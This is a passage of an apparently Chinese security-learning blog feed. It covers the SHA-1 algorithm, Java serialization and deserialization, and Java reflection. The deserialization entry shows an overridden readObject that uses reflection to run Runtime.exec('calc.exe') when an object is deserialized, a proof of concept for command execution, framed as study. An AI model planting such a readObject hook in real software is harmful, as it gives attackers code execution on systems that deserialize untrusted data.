class="code"><pre><code class="hljs lisp">&#x27;a&#x27;=97       &#x27;b&#x27;=98       &#x27;c&#x27;=99<br>&#x27;a&#x27;=01100001 &#x27;b&#x27;=01100010 &#x27;c&#x27;=01100011<br></code></pre></td></tr></table></figure><h3 id="对转换后的位字符串进行补位操作"><a href="#对转换后的位字符串进行补位操作" class="headerlink" title="对转换后的位字符串进行补位操作"></a>对转换后的位字符串进行补位操作</h3><p>Sha-1算法标准规定，必须对消息摘要进行补位操作，即将输入的数据进行填充，使得数据长度对512求余的结果为448，填充比特位的最高位补一个1，其余的位补0，如果在补位之前已经满足对512取模余数为448，也要进行补位，在其后补一位1即可。总之，补位是至少补一位，最多补512位，我们依然以“abc”为例，其补位过程如下：</p><p>初始的信息摘要：<code>01100001 01100010 01100011</code></p><p>第一步补位：   <code>01100001 01100010 01100011 1</code></p><p>…..        ……</p><p>补位最后一位：  <code>01100001 01100010 01100011 10.......0</code>(后面补了423个0)</p><p>而后我们将补位操作后的信息摘要转换为十六进制，如下所示：</p><p><code>61626380 00000000 00000000 00000000</code></p><p><code>00000000 00000000 00000000 00000000</code></p><p><code>00000000 00000000 00000000 00000000</code></p><p><code>00000000 00000000</code></p><p>(这里值得注意的是61626380 代表的刚好是4个8位二进制数，也就是指的是<code>01100001 01100010 01100011 10000000</code>)</p><h3 id="附加长度值"><a href="#附加长度值" class="headerlink" title="附加长度值"></a>附加长度值</h3><p>在信息摘要后面附加64bit的信息，用来表示原始信息摘要的长度，在这步操作之后，信息报文便是512bit的倍数。通常来说用一个64位的数据表示原始消息的长度，如果消息长度不大于2^64，那么前32bit就为0，在进行附加长度值操作后，其“abc”数据报文即变成如下形式：</p><p><code>61626380 00000000 00000000 00000000</code></p><p><code>00000000 00000000 00000000 00000000</code></p><p><code>00000000 00000000 00000000 00000000</code></p><p><code>00000000 00000000 00000000 00000018</code></p><p>因为“abc”占3个字节，即24位 ，换算为十六进制即为0x18。</p><h3 id="初始化缓存"><a href="#初始化缓存" class="headerlink" title="初始化缓存"></a>初始化缓存</h3><p>一个160位MD缓冲区用以保存中间和最终散列函数的结果。它可以表示为5个32位的寄存器(H0,H1,H2,H3,H4)。初始化为：</p><p><code>H0 = 0x67452301</code></p><p><code>H1 = 0xEFCDAB89</code></p><p><code>H2 = 0x98BADCFE</code></p><p><code>H3 = 0x10325476</code></p><p><code>H4 = 0xC3D2E1F0</code></p><h3 id="计算消息摘要"><a href="#计算消息摘要" class="headerlink" title="计算消息摘要"></a>计算消息摘要</h3><p>在计算报文之前我们还要做一些基本的工作，就是在我们计算过程中要用到的方法，或定义。</p><p>(1)、循环左移操作符Sn(x),x是一个字，也就是32bit大小的变量，n是一个整数且0&lt;&#x3D;n&lt;&#x3D;32。Sn(X) &#x3D; (X&lt;&lt;n)OR(X&gt;&gt;32-n)</p><p>(2)、在程序中所要用到的常量，这一系列常量字k(0)、k(1)、…k(79)，将其以十六进制表示如下：</p><p><code>Kt = 0x5A827999  (0 &lt;= t &lt;= 19)</code></p><p><code>Kt = 0x6ED9EBA1 (20 &lt;= t &lt;= 39)</code></p><p><code>Kt = 0x8F1BBCDC (40 &lt;= t &lt;= 59)</code></p><p><code>Kt = 0xCA62C1D6 (60 &lt;= t &lt;= 79)</code></p><p>(3)、所要用到的一系列函数</p><p> <code>Ft(b,c,d)  ((b&amp;c)|((~b)&amp;d))   (0 &lt;= t &lt;= 19)</code></p><p> <code>Ft(b,c,d) (b^c^d)       (20 &lt;= t &lt;= 39)</code></p><p> <code>Ft(b,c,d) ((b&amp;c)|(b&amp;d)|(c&amp;d))  (40 &lt;= t &lt;= 59)</code></p><p> <code>Ft(b,c,d) (b^c^d)        (60 &lt;= t &lt;= 79)</code></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202272045274.png"></p><h3 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h3><p>必须使用进行了补位和补长度后的消息来计算消息摘要。</p><p>计算需要一个缓冲区，由5个32位的字组成，还需要一个80个32位字的缓冲区。第一个5个字的缓冲区被标识为A，B，C，D，E。80个字的缓冲区被标识为W0, W1,…, W79</p><p>另外还需要一个一个字的TEMP缓冲区。</p><p>为了产生消息摘要，在第4部分中定义的16个字的数据块M1, M2,…, Mn</p><p>会依次进行处理，处理每个数据块Mi 包含80个步骤。</p><p>现在开始处理M1, M2, … , Mn。为了处理 Mi,需要进行下面的步骤</p><ul><li><p>(1). 将 Mi 分成 16 个字 W0, W1, … , W15,  W0 是最左边的字<strong>（512bit）</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202272046606.gif" alt="153211992014696001"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202272047733.jpeg" alt="img"></p></li><li><p>(2). 对于 t &#x3D; 16 到 79 令 Wt &#x3D; S1(Wt-3 XOR Wt-8 XOR Wt- 14 XOR Wt-16).</p></li><li><p>(3). 令 A &#x3D; H0, B &#x3D; H1, C &#x3D; H2, D &#x3D; H3, E &#x3D; H4.</p></li><li><p>(4) 对于 t &#x3D; 0 到 79，执行下面的循环</p><p>​    TEMP &#x3D; S5(A) + ft(B,C,D) + E + Wt + Kt;</p><p>​    E &#x3D; D; D &#x3D; C; C &#x3D; S30(B); B &#x3D; A; A &#x3D; TEMP;</p></li><li><p>(5). 令 H0 &#x3D; H0 + A, H1 &#x3D; H1 + B, H2 &#x3D; H2 + C, H3 &#x3D; H3 + D, H4 &#x3D; H4 + E</p><p>在处理完所有的 Mn, 后，消息摘要是一个160位的字符串，以下面的顺序标识</p><p>H0 H1 H2 H3 H4。</p></li></ul><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>SHA1Context sha;<br><span class="hljs-type">int</span> i, err;<br><span class="hljs-type">uint8_t</span> Message_Digest[<span class="hljs-number">20</span>];<br><span class="hljs-comment">// testing SHA1</span><br><span class="hljs-type">char</span>  *test = <span class="hljs-string">&quot;213124314124123asdasdas&quot;</span>;<br><span class="hljs-built_in">printf</span>( <span class="hljs-string">&quot;\n测试值:\t“%s”\n&quot;</span>,test);<br>err = SHA1Reset(&amp;sha);    <span class="hljs-comment">//erro and return 0</span><br><span class="hljs-keyword">if</span> (err)<br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;SHA1重置错误 %d.\n&quot;</span>, err );<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>err = ISD_SHA1Input(&amp;sha, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)test, <span class="hljs-built_in">strlen</span>(test));<br><span class="hljs-keyword">if</span> (err)<br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;SHA1输入错误 %d.\n&quot;</span>, err );<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>err = ISD_SHA1Result(&amp;sha, Message_Digest);<br><span class="hljs-keyword">if</span> (err)<br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<br>    <span class="hljs-string">&quot;SHA1结果错误 %d, 不能计算摘要值.\n&quot;</span>,<br>    err );<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;摘要值:\t&quot;</span>);<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">20</span> ; ++i)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%02X &quot;</span>, Message_Digest[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>课堂知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>密码学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化</title>
    <link href="/2022/02/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2022/02/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h1><h2 id="为什么要有反序列化"><a href="#为什么要有反序列化" class="headerlink" title="为什么要有反序列化"></a>为什么要有反序列化</h2><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">Java序列化是指把Java对象转换为字节序列的过程(便于保存在内存、文件、数据库中)，ObjectOutputStream类的<span class="hljs-built_in">writeObject</span>()方法可以实现序列化。<br></code></pre></td></tr></table></figure><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">Java反序列化是指把字节序列恢复为Java对象的过程，ObjectInputStream类的<span class="hljs-built_in">readObject</span>()方法用于反序列化。<br></code></pre></td></tr></table></figure><p>序列化后的文件可以方便在各个平台使用windows、linux等。</p><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><ul><li>1.该类必须实现 java.io.Serializable 接口。</li><li>2.该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。</li></ul><p><strong>注意点：用transient关键字修饰的属性除外，不参与序列化过程。</strong></p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">people</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">people</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Serialize&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializePeople</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;people.bin&quot;</span>));<br>        <span class="hljs-type">people</span> <span class="hljs-variable">people</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">people</span>();<br>        objectOutputStream.writeObject(people);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271650605.png" alt="QQ截图20220227163104"></p><p>生成的二进制文件看不懂。</p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileNotFoundException;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnSerializePeople</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;people.bin&quot;</span>));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        System.out.println(o);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271650623.png" alt="QQ截图20220227163615"></p><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>这里就不一一复现<code>transient</code>关键字了</p><h2 id="利用反序列化漏洞"><a href="#利用反序列化漏洞" class="headerlink" title="利用反序列化漏洞"></a>利用反序列化漏洞</h2><p>之前学习了反射弹计算器。这里试着用java反序列化复现一下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">people</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">people</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Serialize&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br>        in.defaultReadObject();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor();<br>        declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        exec.invoke(declaredConstructor.newInstance(),<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>此时如果在经过序列化，反序列化，就会弹出计算器。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271648736.png" alt="QQ截图20220227164828"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br>    in.defaultReadObject();<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor();<br>    declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>    exec.invoke(declaredConstructor.newInstance(),<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>详细解释一下下面这串代码中的细节。</p><ul><li>重写了一下readObject这个方法。</li><li><code>in.defaultReadObject()</code>调用原始的readObject方法</li><li>利用反射。</li></ul>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深度理解反射</title>
    <link href="/2022/02/27/%E6%B7%B1%E5%BA%A6%E7%90%86%E8%A7%A3%E5%8F%8D%E5%B0%84/"/>
    <url>/2022/02/27/%E6%B7%B1%E5%BA%A6%E7%90%86%E8%A7%A3%E5%8F%8D%E5%B0%84/</url>
    
    <content type="html"><![CDATA[<h1 id="深度理解反射"><a href="#深度理解反射" class="headerlink" title="深度理解反射"></a>深度理解反射</h1><h2 id="区别类的初始化和类的实例化"><a href="#区别类的初始化和类的实例化" class="headerlink" title="区别类的初始化和类的实例化"></a>区别类的初始化和类的实例化</h2><h3 id="类的初始化"><a href="#类的初始化" class="headerlink" title="类的初始化"></a>类的初始化</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo1</span> &#123;<br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;这里是初始块&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">static</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;这里是静态初始块&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Demo1</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;这里是构造函数&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RealizeDemo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        Class.forName(<span class="hljs-string">&quot;xsw6a.Demo1&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271507364.png"></p><p>这里仅仅只是执行了静态初始。即当类加载进了内存，只有<strong>静态初始块</strong>得到了执行。</p><h3 id="类的实例化"><a href="#类的实例化" class="headerlink" title="类的实例化"></a>类的实例化</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RealizeDemo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo1</span>();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271509598.png" alt="QQ截图20220227150956"></p><p>执行顺序。</p><h2 id="利用反射弹出计算器（后续漏洞基本都要用到）"><a href="#利用反射弹出计算器（后续漏洞基本都要用到）" class="headerlink" title="利用反射弹出计算器（后续漏洞基本都要用到）"></a>利用反射弹出计算器（后续漏洞基本都要用到）</h2><h3 id="getMethod"><a href="#getMethod" class="headerlink" title="getMethod"></a>getMethod</h3><p>获取某类中的方法：Class.forName(“java.lang.Runtime”).getMethod(“exec”, String.class)</p><p>获取Runtime类下的exec方法。</p><h3 id="invoke"><a href="#invoke" class="headerlink" title="invoke"></a>invoke</h3><p>**invoke(类对象，exec方法传入的参数)**，这里的类对象必须是已经实例化的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;<br><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> 